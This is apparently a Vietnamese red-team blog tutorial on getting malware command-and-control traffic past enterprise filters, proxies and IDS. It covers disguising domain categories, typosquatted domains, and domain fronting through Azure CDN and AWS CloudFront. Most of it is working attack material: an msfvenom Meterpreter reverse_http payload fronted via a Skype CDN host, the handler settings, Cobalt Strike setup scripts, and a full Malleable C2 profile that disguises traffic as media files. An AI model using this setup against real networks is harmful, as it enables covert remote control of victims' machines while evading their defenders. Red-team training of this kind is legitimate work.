![](https://images.viblo.asia/5bb2cadf-6bad-4884-8e52-d55cadc69b5d.jpg)

## Network Filters

Khi một malware được cài đặt vào máy của nạn nhân, nó sẽ cố gắng kết nối tới C2 thông qua các giao thức mạng được thiết lập từ trước. Tuy nhiên trong mạng doanh nghiệp, chúng ta sẽ bắt gặp nhiều giải pháp bảo mật khác nhau như **Web Proxy**, **IDS**, **Deep Packet Inspection** và buộc phải vượt qua chúng.

Mô hình như sau :

![](https://images.viblo.asia/5f280143-022e-4fbc-9aa0-e4cec0bbbc24.png)


Ở đây ta thấy, nếu chúng ta cài đặt thành công Malware vào máy nạn nhân (ví dụ: Phishing),  kết nối đi từ máy nạn nhân tới C2 sẽ gặp nhiều thách thức khác nhau từ các giải pháp bảo mật.

Vì mô hình này tốn kém và phức tạp, nên trong một số tổ chức nó được đơn giản hóa bằng cách kết hợp đa chức năng trên cùng một thiết bị. Ví dụ một máy chủ proxy có thể không chỉ đóng vai trò như một proxy mà kiêm nhiệm cả chức năng IDS,SSL và Domain filtering.


### 1. DNS Filters

Khi tiến hành tạo một domain cho C2, thông thường chúng ta đăng ký một domain hoàn toàn mới để nằm ngoài blacklist của Firewall ở các cuộc tấn công trước đó (nếu có). Điều này có thể gây bất lợi  do "độ uy tín" của những domain này tương đối thấp, thời gian đăng ký sử dụng ngắn , lưu lượng truy cập lại ít. Do đó chúng ta nên đăng ký domain từ trước, đồng thời  tạo lưu lượng truy cập ổn định trước khi mang domain ra sử dụng.

Ngoài ra website phải được "núp bóng" dưới danh nghĩa các trang web vô hại. Thay vì gán các category thú vị như "phishing" ,"virus", "webmail" thì ta có thể gán các category  liên quan tới ẩm thực ,du lịch hay nghệ thuật . 

(**Điều này phải làm ngay sau khi tạo một website để được phân loại vào danh mục vô hại**)

Tuy nhiên trong trường hợp domain của chúng ta bị liệt vào danh sách "độc hại" chúng ta cũng có thể yêu cầu đánh lại category tại **https://domain.opendns.com/**

![](https://images.viblo.asia/4ef00c40-99a9-41f3-bb28-07fb64626551.png)


Ngoài ra, chúng ta nên thực hiện các bước để làm tên miền có thêm tính hợp pháp. Ví dụ một tên miền bao gồm văn bản hợp pháp sẽ tốt hơn một domain bao gồm nhiều ký tự lằng nhằng, ngẫu nhiên, bao gồm cả chữ cả số . Một kỹ thuật được sử dụng phổ biến của các Hacker là sử dụng domain "sai chính tả". Ví dụ mục tiêu sử dụng domain **example.com** thì chúng ta có thể sử dụng **exampl1e.com** hoặc **examplle.com** , **Examlpe.com**

>Chúng ta nên kiểm tra kỹ C2 Domain có nằm trong danh sách độc hại không thông qua một số trang như Virustotal hay IPVoid trước khi thực hiện redteam. 


>
>Cuối cùng thì Subdomain Takeover vẫn là xịn xò  nhất  


### 2. Full Packet Capture Devices

[![wireshark-1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/wireshark-1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/wireshark-1.png)

Một số doanh nghiệp yêu cầu độ bảo mật cao, đồng thời có nhiều Blue Team kinh nghiệm có thể sử dụng Wireshark để chặn bắt gói tin của Malware, từ đó phát hiện ra lưu lượng mạng độc hại. Với cách này chúng ta không có kỹ thuật "bypass" nào có thể được sử dụng. Chỉ cố gắng hạn chế tối đa lưu lượng bất thường bằng cách thử nghiệm nhiều lần trên máy local trước khi tham gia chiến dịch. Ví dụ công ty đặt tại Viêt Nam nhưng Malware lại trỏ lưu lượng về C2 ở ...Châu Phi. Đó là điều cần phải khắc phục !!!

### 3. Domain Fronting

> Domain Fronting có thể là giải pháp hiệu quả nhất để Bypass Network Filters. Theo đó chúng ta sẽ "trộn" lưu lượng C2 của mình thông qua một CDN hợp pháp

### 3.1. Domain Fronting with Azure CDN

[![1_6Y7M_IdvS8Knudccze4XDw.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/1_6Y7M_IdvS8Knudccze4XDw.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/1_6Y7M_IdvS8Knudccze4XDw.png)

Ở phần này, chúng ta sẽ cùng đi qua cách cấu hình Domain Fronting với Microsoft Azure. 

Nguyên liệu
* Một Domain (babyshophorse.tk)
* Tài khoản Microsoft Azure
* Một Server đóng vai trò C&C 

**Bước 1**. Đăng nhập tài khoản Azure, tạo CDN

[![YAEScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/YAEScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/YAEScreenshot_1.png)

**Bước 2**. Cài đặt các thông số cần thiết

Trong đó giá trị **tier** buộc phải đặt là **Standard Verizon**

[![yAYScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/yAYScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/yAYScreenshot_3.png)


**Bước 3**. Tạo thành công

[![3S4Screenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/3S4Screenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/3S4Screenshot_4.png)

[![WdrScreenshot_5.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/WdrScreenshot_5.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/WdrScreenshot_5.png)

Tiếp tới cấu hình Router như sau

[![LWyScreenshot_6.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/LWyScreenshot_6.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/LWyScreenshot_6.png)

*Việc Disable Cache là bắt buộc, Cache sẽ làm lỗi kết nối C2 của chúng ta*

[![ZxaScreenshot_7.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/ZxaScreenshot_7.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/ZxaScreenshot_7.png)


**Bước 4**: Tìm một lớp "áo" bọc bên ngoài. 

Vì chúng ta thiết lập một endpoint CDN Azure. Nên domain cần tìm cũng phải được lưu trữ trên Azure. Cụ thể chúng ta cần một domain *.azureedge.net . 

Sử dụng **FindFrontableDomains** để làm điều này

```bash
git clone https://github.com/rvrsh3ll/FindFrontableDomains.git
sudo ./setup.sh
python3 FindFrontableDomains.py --domain skype.com -threads 20
```
*Tập trung tìm kiếm các domain liên quan tới Microsoft cho thấy hiệu quả cao hơn*

[![HmQScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/HmQScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/HmQScreenshot_1.png)

Ở đây ta có thể dùng các domain hiển thị bên trên làm lớp "áo" bên ngoài

**Bước 5**. Dùng "áo" (sdk.cdn.skype.com) bọc bên ngoài

[![N7kScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/N7kScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/N7kScreenshot_2.png)

Kiểm tra kết nối với Wireshark. Ta nhận thấy ban đầu connect được thực hiện tới **sdk.cdn.skype.com** sau đó được chuyển hướng tới máy chủ C2 của chúng ta

[![t6cScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/t6cScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/t6cScreenshot_3.png)

Vì nhiều tổ chức thường sử dụng Skype cho các cuộc họp, lưu lượng truy cập kiểu này sẽ không nổi bật và hoàn toàn hợp pháp. Nó sẽ bypass tất cả mọi thứ (Domain, DNS, Proxy) trong một lần 

**Hacker Mode**

Tạo payload Msfvenom trên C&C

```bash
msfvenom -p windows/x64/meterpreter/reverse_http lhost=sdk.cdn.skype.com lport=80 HttpHostHeader=azure-f6f3bhaucthwa9hq.z01.azurefd.net -f exe > http-df.exe
```

Lắng nghe với **multi/handler**

```bash
set LHOST sdk.cdn.skype.com
set OverrideLHOST sdk.cdn.skype.com
set OverrideRequestHost true
set HttpHostHeader azure-f6f3bhaucthwa9hq.z01.azurefd.net
run -j
```

### 3.2. Domain Fronting with AWS CloudFront


[![df_http_noproxy2.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/df_http_noproxy2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/df_http_noproxy2.png)

**Ưu điểm**
* Tích hợp lưu lượng C2 vào CDN
* CloudFront ít khi bị chặn, vì nếu chặn sẽ ảnh hưởng tới các dịch vụ khác của công ty
* IP Source bị ẩn đi, nên không cần thay thế thường xuyên (Do bị block)
* Lưu lượng được mã hóa với HTTPS
* Tên miền uy tín

[![M5nScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/M5nScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/M5nScreenshot_3.png)

**Thiết lập**

1. Setup a Cobalt Strike (CS) server
2. Register a domain and point it your CS server
3. Generate an HTTPS cert for your domain
4. Create a CloudFront distribution to point to your domain
5. Generate a CS profile that utilizes your HTTPS cert and the CloudFront distribution
6. Generate a CS payload to test the setup

**Cài đặt**

Đăng ký domain http://576747640bbc9e8922cb0c45c7357ccee4ccd36a.tk

(Subdomain *kubi.576747640bbc9e8922cb0c45c7357ccee4ccd36a.tk*)

[![micScreenshot_3.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/micScreenshot_3.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/micScreenshot_3.png)

Sau đó tiến hành trỏ về server

[![pA7Screenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/pA7Screenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/pA7Screenshot_1.png)


Tạo SSL với Let's Encrypt

```bash
sudo apt-get install -y git lsof
sudo apt install certbot python3-certbot-apache;
cd && wget https://raw.githubusercontent.com/killswitch-GUI/CobaltStrike-ToolKit/master/HTTPsC2DoneRight.sh 
&& chmod +x HTTPsC2DoneRight.sh && ./HTTPsC2DoneRight.sh

```
**Lưu ý: Phải cài đặt certbort trước, nếu không tool sẽ không chạy**

[![ds0Screenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/ds0Screenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/ds0Screenshot_4.png)

* DNS : Domain của bạn

* Common password : Mật khẩu profile (trường hợp này đặt là nopassword)

* CobaltStrike : Vị trí CS trên server


Sau khi cài đặt hoàn thành , ta có 2 nội dung file sau trong CobaltStrike Forder

[![ecyScreenshot_5.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/ecyScreenshot_5.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/ecyScreenshot_5.png)

Quan tâm 4 dòng cuối file amazon.profile (4 dòng cuối này sẽ được dùng ở phía dưới)

[![Screenshot_6.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/Screenshot_6.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/Screenshot_6.png)

**Đưa traffic qua CloudFront**

Truy cập https://console.aws.amazon.com/cloudfront/home

Create Distribution

[![Screenshot_7.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/Screenshot_7.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/Screenshot_7.png)

[![Screenshot_8.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/Screenshot_8.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/Screenshot_8.png)


[![Screenshot_9.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/Screenshot_9.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/Screenshot_9.png)

Quá trình khởi tạo thành công, CloudFront  sẽ cấp cho chúng ta một Domain mới (@cloudfront.net)

[![Screenshot_10.png](https://0xbadcode.ml/uploads/images/gallery/2022-03/scaled-1680-/Screenshot_10.png)](https://0xbadcode.ml/uploads/images/gallery/2022-03/Screenshot_10.png)


**Tạo profile C&C mới sử dụng Malleable-C2-Randomizer** 
```bash

git clone https://github.com/bluscreenofjeff/Malleable-C2-Randomizer && cd Malleable-C2-Randomizer 
python malleable-c2-randomizer.py -profile Sample\ Templates/Pandora.profile -notest
cp /root/Malleable-C2-Randomizer/pandora__W0l1reuH.profile /home/hoamsfconsole/cobaltstrike4.4/httpsProfile

```

Sau khii tạo thành công, chúng ta tiến hành sửa chữa như sau 

* Add https-cert (4 dòng ở phía trên)

```json
https-certificate {
set keystore "kubi.576747640bbc9e8922cb0c45c7357ccee4ccd36a.tk.store";
set password "nopassword";
}
```

* Add time số post-ex
```json
post-ex {        
        set spawnto_x86 "%windir%\\syswow64\\mstsc.exe";
        set spawnto_x64 "%windir%\\sysnative\\mstsc.exe";
}
```

* Thay đổi giá trị "Host" sang CloudFront domain

```json
        header "Host" "d2hc65zh7vhy7u.cloudfront.net";
```


Hoàn tất quá trình, ta sẽ có một profile như sau :

```json
set sleeptime "030";
set jitter    "0";
set maxdns    "244";
set useragent "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)";


http-get {

    set uri "/access/";

    client {

        header "Accept" "*/*";
        header "GetContentFeatures.DLNA.ORG" "1";
        header "Host" "d2hc65zh7vhy7u.cloudfront.net";
        header "Cookie" " __utma=204159236.1625460612.9748758395.2605486039.4133151740.2;";

        parameter "version" "4";
        parameter "lid" "0329816287";

        metadata {
            netbios;
            parameter "token";
        }
    }

    server {

        header "Server" "Apache";
        header "Cache-Control" "no-cache, no-store, must-revalidate, max-age=-1";
        header "Pragma" "no-cache, no-store";
        #header "Expires" "-1";
        header "Connection" "close";
        header "Content-Type" "audio/mp4";

        output {

            # mp4 header
            # 0000000: 0000 001c 6674 7970 6d70 3432 0000 0001  ....ftypmp42....
            # 0000010: 4d34 5620 6d70 3432 6973 6f6d 0001 6fd9  M4V mp42isom..o.

            prepend "\x6d\x6f\x6f\x76\x00\x00\x00\x6c\x6d\x76\x68\x64";
            prepend "\x4d\x34\x56\x20\x6d\x70\x34\x32\x69\x73\x6f\x6d\x00\x01\x6f\xd9";
            prepend "\x00\x00\x00\x1c\x66\x74\x79\x70\x6d\x70\x34\x32\x00\x00\x00\x01";

            print;
        }
    }
}

http-post {
    
    set uri "/radio/xmlrpc/v35";

    client {

        header "Accept" "*/*";
        header "Content-Type" "text/xml";
        header "X-Requested-With" "XMLHttpRequest";
        header "Host" "d2hc65zh7vhy7u.cloudfront.net";

        id {
            parameter "rid";
        }

        parameter "lid" "3962082724";
        parameter "method" "getSearchRecommendations";

        output {
            base64;
            print;
        }
    }

    server {

        header "Content-Type" "text/xml";
        header "Cache-Control" "no-cache, no-store, no-transform, must-revalidate, max-age=0";
        header "Expires" "-1";
        header "Vary" "Accept-Encoding";
        header "Content-Encoding" "gzip";

        output {
            print;
        }
    }
}

https-certificate {
set keystore "kubi.576747640bbc9e8922cb0c45c7357ccee4ccd36a.tk.store";
set password "nopassword";
}

post-ex {        
        set spawnto_x86 "%windir%\\syswow64\\mstsc.exe";
        set spawnto_x64 "%windir%\\sysnative\\mstsc.exe";
}

```

**4 Thực thi**

```
./teamserver IP [password] pandora__W0l1reuH.profile 

```